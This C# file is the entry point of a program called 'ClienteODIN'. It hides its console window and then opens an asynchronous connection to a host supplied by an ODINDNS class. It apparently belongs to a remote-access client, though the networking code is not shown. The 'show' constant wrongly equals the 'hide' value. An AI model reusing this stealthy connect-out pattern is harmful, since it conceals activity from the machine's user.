using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClienteODIN
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 0;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            // Show
            ShowWindow(handle, SW_SHOW);
            ODINDNS Host = new ODINDNS();
            NET.HandlerConnetionAsync ODIN = new NET.HandlerConnetionAsync();
            ODIN.HandlerEvents(Host.getHost());
            Console.ReadKey();

        }
    }
}
